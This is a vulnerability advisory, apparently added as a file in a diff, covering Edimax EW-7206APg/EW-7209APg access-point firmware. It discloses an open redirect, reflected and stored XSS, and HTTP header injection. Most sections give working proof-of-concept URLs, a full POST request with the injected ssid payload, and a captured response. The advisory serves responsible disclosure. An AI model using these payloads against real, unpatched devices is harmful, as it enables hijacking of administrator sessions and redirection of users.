@@ -1,0 +1,107 @@
+Device Name: EW-7206APg / EW-7209APg
+Vendor: Edimax
+
+============  Vulnerable Firmware Releases: ============ 
+
+Device: EW-7206APg
+ Hardware Version 	 	Rev. A
+ Runtime Code Version 	v1.32 
+ Runtime Code Version 	V1.33
+
+Device: EW-7209APg
+ Hardware Version 	 	Rev. A
+ Runtime Code Version 	1.21 
+ Runtime Code Version 	1.29 
+
+============ Device Description: ============ 
+
+Acting as a bridge between the wired Ethernet and the 2.4GHz IEEE 802.11g/b wireless LAN, this wireless LAN access point can let your wireless LAN client stations access both the wired and the wireless network nodes.
+
+EW-7206APg: http://www.edimax.com/en/produce_detail.php?pl1_id=25&pl2_id=134&pl3_id=359&pd_id=18
+EW-7209APg: http://www.edimax-de.eu/de/support_detail.php?pd_id=18&pl1_id=1
+
+============ Vulnerability Overview: ============ 
+
+* URL Redirection: 
+	Parameter:	submit-url and wlan_url
+
+http://192.168.178.175/goform/formWirelessTbl?submit-url=http://www.google.de
+
+http://192.168.178.175/goform/formWlanSetup?apMode=0&band=2&ssid=test&chan=11&macAddrValue=5C260A2BF03F&wlanMacClone=0&wlanMac=000000000000&autoMacClone=no&repeaterSSID=&wlLinkMac1=000000000000&wlLinkMac2=000000000000&wlLinkMac3=000000000000&wlLinkMac4=000000000000&wlLinkMac5=000000000000&wlLinkMac6=000000000000&x=57&y=20&wlan-url=http://www.pwnd.pwnd
+
+* reflected XSS:
+	Parameter: 	submit-url and wlan-url
+				
+Injecting scripts into the parameter submit-url or wlan-url reveals that this parameter is not properly validated for malicious input.
+
+Example Exploit:
+http://192.168.178.175/goform/formWlanSetup?apMode=0&band=2&ssid=&chan=11&macAddrValue=&wlanMacClone=0&wlanMac=&autoMacClone=no&repeaterSSID=&wlLinkMac1=&wlLinkMac2=&wlLinkMac3=&wlLinkMac4=&wlLinkMac5=&wlLinkMac6=&x=54&y=12&wlan-url=test><script>alert('XSSed')</script>test
+
+* stored XSS 
+
+	* in System Utility -> Domain Name:
+		=> parameter: DomainName
+		
+Injecting scripts into the parameter DomainName reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+http://192.168.178.175/goform/formTcpipSetup?oldpass=&newpass=&confpass=&ip=192.168.178.175&mask=255.255.255.0&gateway=0.0.0.0&dhcp=2&DhcpGatewayIP=0.0.0.0&DhcpNameServerIP=0.0.0.0&dhcpRangeStart=192.168.178.100&dhcpRangeEnd=192.168.178.200&DomainName="><script>alert(2)</script>&leaseTimeGet=946080000&leaseTime=946080000&B1.x=52&B1.y=21&submit-url=%2Fsysutility.asp&ipChanged=
+
+	* Stored XSS in wireless settings / basic settings -> ESSID
+		-> The injected script code gets executed within the device information
+
+Injecting scripts into the parameter ssid reveals that this parameter is not properly validated for malicious input. You need to be authenticated or you have to find other methods for inserting the malicious JavaScript code.
+
+Example Request:
+POST /goform/formWlanSetup HTTP/1.1
+Host: 192.168.178.175
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:14.0) Gecko/20100101 Firefox/14.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Proxy-Connection: keep-alive
+Referer: http://192.168.178.175/wlbasic.asp
+Authorization: Basic xxx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 351
+
+apMode=0&band=2&ssid=%22%3E%3Cimg+src%3D%220%22+onerror%3Dalert%281%29%3E&chan=11&macAddrValue=5C260A2BF03F&wlanMacClone=0&wlanMac=000000000000&autoMacClone=no&repeaterSSID=&wlLinkMac1=000000000000&wlLinkMac2=000000000000&wlLinkMac3=000000000000&wlLinkMac4=000000000000&wlLinkMac5=000000000000&wlLinkMac6=000000000000&x=50&y=20&wlan-url=%2Fwlbasic.asp
+
+* HTTP Header Injection:
+
+	Parameter: submit-url
+
+Injecting code into the parameter submit-url mode reveals that this parameter is not properly validated for malicious input and so it is possible to manipulate the header information.
+
+http://192.168.178.175/goform/formWirelessTbl?submit-url=e82f5%0d%0aNew%20Header:%20PWND
+
+Response:
+HTTP/1.0 302 Redirect
+Server: GoAhead-Webs
+Date: Sat Jan  1 14:06:23 2000
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Type: text/html
+Location: http://192.168.178.175/e82f5
+New Header: PWND
+<snip>
+
+============ Solution ============
+
+No known solution available.
+
+============ Credits ============
+
+The vulnerability was discovered by Michael Messner
+Mail: devnull#at#s3cur1ty#dot#de
+Web: http://www.s3cur1ty.de
+Advisory URL: http://www.s3cur1ty.de/m1adv2013-009
+Twitter: @s3cur1ty_de
+
+============ Time Line: ============
+
+September 2012 - discovered vulnerability
+21.09.2012 - contacted vendor with vulnerability details
+24.09.2012 - vendor responded that they will not provide a fix
+14.02.2013 - public disclosure
+
+===================== Advisory end =====================
